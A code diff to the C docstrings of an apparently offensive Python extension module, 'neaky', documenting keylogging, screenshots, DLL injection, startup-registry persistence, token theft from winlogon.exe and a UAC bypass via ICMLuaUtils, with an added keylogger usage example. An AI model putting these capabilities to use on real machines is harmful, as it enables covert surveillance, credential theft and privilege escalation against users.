@@ -6,65 +6,72 @@ PyDoc_STRVAR(
     "keylog_to_file(path: str, /)\n"
     "--\n"
     "\n"
-    "def keylog_to_file(path: str)\n"
-    "Start keylogging into a file.");
+    "Start keylogging into a file specified by (path: str).\n"
+    "example: \n"
+    "```python\n\
+    import neaky,time,threading\n\
+    def end_log():\n\
+        time.sleep(7)\n\
+        neaky.keylog_to_file_stop()\n\
+    neaky.keylog_to_file(r'C:\\Users\\warren\\Desktop\\a.txt')\n\
+    t = threading.Thread(target=end_log)\n\
+    t.start()\n\
+    neaky.message_loop()\n\
+```");
 
 PyDoc_STRVAR(
     screenshot_doc,
     "screenshot(path: str, /)\n"
     "--\n"
     "\n"
-    "def screenshot(path: str)\n"
-    "Save screenshot to path.");
+    "Save screenshot to path specified by (path: str).");
 
 PyDoc_STRVAR(
     get_pid_by_name_doc,
     "get_pid_by_name(name: str, /)\n"
     "--\n"
     "\n"
-    "def get_pid_by_name(name: str)\n"
-    "Return the first process's pid that matches name(use wcsicmp(from start, allow partial"
-    " case insensetive)).");
+    "Return the first process's pid that matches (name: str, /) (using wcsicmp) (from start, allow partial match, "
+    "case insensetive).");
 
 PyDoc_STRVAR(
     get_pids_by_name_doc,
     "get_pids_by_name(name: str, /)\n"
     "--\n"
     "\n"
-    "def get_pids_by_name(name: str)\n"
-    "Return a list of processes's pid that matches name(use wcsicmp(from start, allow partial"
-    " case insensetive)).");
+    "Return a list of processes's pid that matches (name: str, /) (using wcsicmp) (from start, allow partial match, "
+    "case insensetive).\n\n"
+    ":returns: list\n");
 
 PyDoc_STRVAR(
     remote_thread_injection_doc,
     "remote_thread_injection(dll_path: str, pid: int, /)\n"
     "--\n"
     "\n"
-    "def remote_thread_injection(dll_path: str, pid: int)\n"
-    "Inject dll to target process.");
+    "Inject dll to target process specified by pid. (dll_path: str, pid: int, /)\n"
+    "\n"
+    ":param dll_path: the path to dll file to be injected\n\n"
+    ":param pid: target process's pid");
 
 PyDoc_STRVAR(
     set_startup_reg_doc,
     "set_startup_reg(key: str, path: str, /)\n"
     "--\n"
     "\n"
-    "def set_startup_reg(key: str, path: str)\n"
-    "Set an entry in startup registry for the executable specified by path.");
+    "Set an entry in startup registry for the executable specified by path. (key: str, path: str, /)");
 
 PyDoc_STRVAR(
     delete_startup_reg_doc,
     "delete_startup_reg(key: str, /)\n"
     "--\n"
     "\n"
-    "def delete_startup_reg(key: str)\n"
-    "Delete an entry in startup registry");
+    "Delete an entry specified by (key: str, /) in startup registry");
 
 PyDoc_STRVAR(
     get_username_doc,
     "get_username()\n"
     "--\n"
     "\n"
-    "def get_username()\n"
     "return the user name of current thread's token.");
 
 PyDoc_STRVAR(
@@ -72,8 +79,7 @@ PyDoc_STRVAR(
     "elevate_thread(pid: int, /)\n"
     "--\n"
     "\n"
-    "def elevate_thread(pid: int)\n"
-    "Steal pid's credential and use for current thread.\n"
+    "Steal process specified by (pid: int, /) 's credential and use for current thread.\n"
     "if no arg is specified, it targets at winlogon.exe.");
 
 PyDoc_STRVAR(
@@ -81,8 +87,7 @@ PyDoc_STRVAR(
     "elevate_execute(program_path: str, cmd: str, pid: int = 0, /)\n"
     "--\n"
     "\n"
-    "def elevate_execute(program_path: str, cmd: str, pid: int = 0)\n"
-    "Steal pid's credential and execute specified program.\n"
+    "Steal pid's credential and execute specified program. (program_path: str, cmd: str, pid: int = 0, /)\n"
     "if no arg is specified, it targets at winlogon.exe.\n"
     "program_path can be omitted and included in cmd");
 
@@ -91,7 +96,6 @@ PyDoc_STRVAR(
     "bypass_uac_exec(program_path: str, cmd: str, /)\n"
     "--\n"
     "\n"
-    "def bypass_uac_exec(program_path: str, cmd: str)\n"
-    "Bypass UAC via ICMLuaUtils COM interface.\n"
-    "Requires that caller and target are both Microsoft signed.\n"
+    "Bypass UAC via ICMLuaUtils COM interface. (program_path: str, cmd: str, /)\n"
+    "To actually bypass UAC, it's required that caller and target are both Microsoft signed.\n"
     "program_path can be omitted and included in cmd");
